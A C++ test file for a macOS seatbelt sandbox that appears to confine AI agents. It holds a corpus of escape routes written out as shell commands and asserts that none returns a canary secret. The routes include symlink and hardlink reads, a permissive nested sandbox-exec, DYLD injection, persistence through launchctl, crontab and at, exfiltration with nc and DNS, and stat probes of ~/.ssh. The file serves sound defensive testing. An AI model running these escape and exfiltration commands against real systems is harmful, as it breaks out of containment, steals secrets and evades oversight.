// the macOS escape corpus: every route out of a seatbelt sandbox we have
// actually tried, as a test. the linux corpus (escape_corpus_test) is the
// model -- one line per technique, each one a real attempt in a real sandbox,
// and the assertion is always the same: the CANARY did not come back.
//
// why a corpus and not more cases in macos_live_check: the live check asks
// "do the walls exist". this asks "does any door in them open", which is a
// list that only grows. each entry below was found by trying it, and a few
// of them DID open before the fix named in the comment -- those are the ones
// that matter, because they are the ones a refactor reopens.
//
// layout per run: a fresh dir R with R/secret/key (the canary, NOT granted)
// and R/ws (granted read-write, the guest's cwd). nothing in $HOME is granted,
// so every home path is also a target.
#include "harness.hpp"

#if defined(__APPLE__)
#include "claybin/macos/backend.hpp"
#include "claybin/policy/policy.hpp"

#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

#include <cstdio>
#include <cstdlib>
#include <string>
#endif

using namespace clay;
using namespace clay::test;

#if defined(__APPLE__)
namespace {

constexpr const char* kCanary = "CLAYBIN-CANARY-7f3a";

// run `sh -c cmd` in the compiled sandbox, cwd ws; return everything it wrote.
std::string run_capture(const macos::Compiled& c, const std::string& ws, const std::string& cmd) {
    int pfd[2];
    if (::pipe(pfd) != 0) return {};
    const std::string full = "cd '" + ws + "' && " + cmd;
    const char* argv[] = {"/bin/sh", "-c", full.c_str(), nullptr};
    macos::SpawnRequest req;
    req.program = "/bin/sh";
    req.argv = argv;
    req.stdout_fd = pfd[1];
    req.stderr_fd = pfd[1];
    auto s = macos::spawn(c, req);
    ::close(pfd[1]);
    std::string out;
    if (s) {
        char buf[4096];
        for (ssize_t n; (n = ::read(pfd[0], buf, sizeof buf)) > 0;) out.append(buf, std::size_t(n));
        int st = 0;
        while (::waitpid(s->pid, &st, 0) < 0) {
        }
    }
    ::close(pfd[0]);
    return out;
}

struct Route {
    const char* name;
    const char* cmd;   // %S = secret dir, %K = key file, %H = $HOME
};

std::string expand(std::string s, const std::string& sec, const std::string& home) {
    for (auto [tok, val] : {std::pair<const char*, std::string>{"%K", sec + "/key"},
                            {"%S", sec}, {"%H", home}}) {
        for (std::size_t at; (at = s.find(tok)) != std::string::npos;) s.replace(at, 2, val);
    }
    return s;
}

// each route must NOT print the canary. a route that needs a host feature
// (a running agent, a docker socket) passes trivially when it is absent,
// which is correct: the corpus asserts "no door", not "door exists".
constexpr Route kRoutes[] = {
    // -- the filesystem, by every name it has ------------------------------
    {"direct read",       "cat %K"},
    {"symlink in ws",     "ln -s %K l && cat l"},
    {"hardlink in ws",    "ln %K h 2>/dev/null && cat h"},
    {"rename into ws",    "mv %K ./k 2>/dev/null && cat k"},
    {"rename dir",        "mv %S ./s 2>/dev/null && cat s/key"},
    {"apfs clone",        "cp -c %K c 2>/dev/null && cat c"},
    {"fd redirect",       "cat /dev/fd/3 3<%K"},
    {"grandchild",        "/bin/sh -c '/bin/sh -c \"cat %K\"'"},
    {"xattr",             "xattr -l %K"},
    // metadata routes: the canary is also a FILE NAME, so listing the
    // ungranted dir would leak it even without reading a byte.
    {"list secret dir",   "ls %S; ls -la %S"},
    {"find secret dir",   "find %S"},
    // -- the sandbox itself --------------------------------------------------
    {"nested sandbox",    "sandbox-exec -p '(version 1)(allow default)' /bin/cat %K"},
    {"dyld insert",       "DYLD_INSERT_LIBRARIES=%K /bin/cat %K"},
    // -- launchd and its daemons: they run OUTSIDE the sandbox ---------------
    // a bare (allow mach-lookup) opened every one of these. the test seeds
    // the pasteboard with the canary from OUTSIDE first, so reading it back
    // is the escape itself, not a proxy for one.
    {"pasteboard read",   "pbpaste"},
    {"launchd submit",    "launchctl submit -l claybin.esc -- /bin/sh -c 'cat %K > /dev/null' && "
                          "sleep 1; launchctl remove claybin.esc"},
    {"osascript shell",   "osascript -e 'do shell script \"cat %K\"'"},
    {"open(1)",           "open -g %K"},
    {"at(1)",             "echo 'cat %K' | at now"},
    {"crontab",           "echo '* * * * * cat %K' | crontab -"},
    // -- the network: nothing to reach, and no DNS to name it -----------------
    {"tcp out",           "cat %K | nc -w2 1.1.1.1 80"},
    {"dns exfil",         "dig +time=1 +tries=1 \"$(cat %K).example.com\""},
};

}  // namespace
#endif

int main() {
#if !defined(__APPLE__)
    return skip("macos_escape_corpus_test", "not macOS");
#else
    const auto host = macos::probe_host();
    if (!host.seatbelt) return skip("macos_escape_corpus_test", "seatbelt unavailable");

    char tmpl[] = "/private/tmp/claybin-esc.XXXXXX";
    if (!::mkdtemp(tmpl)) return skip("macos_escape_corpus_test", "mkdtemp failed");
    const std::string root = tmpl, sec = root + "/secret", ws = root + "/ws";
    const std::string home = std::getenv("HOME") ? std::getenv("HOME") : "/var/empty";
    ::mkdir(sec.c_str(), 0700);
    ::mkdir(ws.c_str(), 0700);
    if (FILE* f = std::fopen((sec + "/key").c_str(), "w")) {
        std::fputs(kCanary, f);
        std::fclose(f);
    }
    // the canary must ALSO be a filename, so the metadata routes have
    // something to leak that is not file content.
    if (FILE* f = std::fopen((sec + "/" + kCanary).c_str(), "w")) std::fclose(f);
    // seed the pasteboard from OUTSIDE: a guest that can read it gets the
    // canary. restored afterwards so the test does not eat a user's copy.
    const bool have_pb = ::access("/usr/bin/pbcopy", X_OK) == 0;
    if (have_pb) std::system("pbpaste > /private/tmp/claybin-esc-pb.saved 2>/dev/null; "
                             "printf CLAYBIN-CANARY-7f3a | pbcopy");

    // a realistic agent posture: the system read-only, one workspace
    // read-write, fork and exec allowed, no network, nothing from $HOME.
    auto c = macos::compile(Policy<Draft>{}
                                .read("/usr").read("/bin").read("/System").read("/Library")
                                .read("/private/etc").read("/private/var/db")
                                .execute("/usr").execute("/bin")
                                .read_write(ws).allow_fork().allow_exec()
                                .seal(),
                            host);
    CHECK(c.has_value());
    if (!c) return finish("macos_escape_corpus_test");

    // the corpus is only worth anything if the guest RUNS: a profile that
    // kills every command passes every route below.
    CHECK(run_capture(*c, ws, "echo alive").find("alive") != std::string::npos);

    for (const auto& r : kRoutes) {
        const std::string out = run_capture(*c, ws, expand(r.cmd, sec, home));
        const bool escaped = out.find(kCanary) != std::string::npos;
        if (escaped) std::fprintf(stderr, "ESCAPE via %s: %s\n", r.name, out.c_str());
        CHECK(!escaped);
    }

    // no side effect survived either: persistence attempts leave nothing.
    CHECK(::access((home + "/Library/LaunchAgents/claybin.esc.plist").c_str(), F_OK) != 0);

    // the metadata oracle. a blanket (allow file-read-metadata) let a guest
    // stat ANY path: `does ~/.ssh/id_ed25519 exist`, its size and mtime, the
    // shape of every project on the disk. contents stayed walled; the map
    // did not. only the ancestors of a grant may be stat'd.
    for (const std::string& p : {sec + "/key", sec, home + "/.ssh", home + "/Library"}) {
        const std::string out =
            run_capture(*c, ws, "stat '" + p + "' >/dev/null 2>&1 && echo STAT-LEAK");
        if (out.find("STAT-LEAK") != std::string::npos)
            std::fprintf(stderr, "ESCAPE via stat oracle: %s\n", p.c_str());
        CHECK(out.find("STAT-LEAK") == std::string::npos);
    }
    // ...while the path DOWN to the workspace still resolves, or nothing
    // that calls realpath/getcwd (git, node, python) can run.
    CHECK(run_capture(*c, ws, "/bin/pwd -P && /usr/bin/realpath .").find("claybin-esc") !=
          std::string::npos);

    std::system(("rm -rf '" + root + "'").c_str());
    if (have_pb) std::system("pbcopy < /private/tmp/claybin-esc-pb.saved; "
                             "rm -f /private/tmp/claybin-esc-pb.saved");
    ::system("launchctl remove claybin.esc >/dev/null 2>&1; crontab -l 2>/dev/null | grep -q "
             "CLAYBIN-CANARY && crontab -r");
    return finish("macos_escape_corpus_test");
#endif
}
